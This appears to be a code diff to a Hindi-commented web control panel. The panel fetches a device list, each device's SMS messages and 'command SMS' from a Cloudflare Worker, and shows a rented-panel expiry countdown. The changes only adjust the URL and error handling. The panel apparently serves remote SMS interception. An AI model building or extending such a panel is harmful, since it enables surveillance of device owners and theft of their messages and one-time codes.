@@ -132,8 +132,8 @@
 
 <script>
   (function() {
-    // ---------- कॉन्फिग – अपने Worker का URL डालो ----------
-    const API_BASE = 'https://polished-recipe-07ea.vikash6759ub.workers.dev/';  // ⚠️ यहाँ अपना असल Worker URL डालो
+    // ---------- ⚠️ अपना Worker URL यहाँ डालो ----------
+    const API_BASE = 'https://nameless-glade-22f4.vikash6759ub.workers.dev';  // ⚠️ अपना असल Worker URL डालो
 
     // ---------- ग्लोबल वेरिएबल ----------
     let devices = [];
@@ -194,10 +194,11 @@
     async function loadDevices() {
       try {
         const res = await fetch(API_BASE + '/api/devices');
+        if (!res.ok) throw new Error('Network response was not ok');
         devices = await res.json();
         renderDeviceList();
       } catch (e) {
-        showDialog('Error loading devices', 'error');
+        showDialog('Error loading devices: ' + e.message, 'error');
       }
     }
 
@@ -260,7 +261,7 @@
         }
         html += '</div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div>';
         document.getElementById('fullscreen-container').innerHTML = html;
-      } catch (e) { showDialog('Error loading SMS', 'error'); }
+      } catch (e) { showDialog('Error loading SMS: ' + e.message, 'error'); }
     });
 
     // ---------- View Command SMS ----------
@@ -284,7 +285,7 @@
         });
         html += '</div><button class="btn" style="background:gray; margin-top:16px;" onclick="closeFullScreen()">CLOSE</button></div>';
         document.getElementById('fullscreen-container').innerHTML = html;
-      } catch (e) { showDialog('Error loading commands', 'error'); }
+      } catch (e) { showDialog('Error loading commands: ' + e.message, 'error'); }
     });
 
     // ---------- Contact us ----------
@@ -306,7 +307,7 @@
         const res = await fetch(API_BASE + '/api/panel-details');
         const data = await res.json();
         showDialog('Panel expires in ' + data.expiryDays + 'd ' + data.expiryHours + 'h ' + data.expiryMinutes + 'm ' + data.expirySeconds + 's', 'success');
-      } catch (e) { showDialog('Error loading panel details', 'error'); }
+      } catch (e) { showDialog('Error loading panel details: ' + e.message, 'error'); }
     });
 
     // ---------- Logout ----------
@@ -504,4 +505,4 @@
   })();
 </script>
 </body>
-                                                                                                          </html>
+</html>
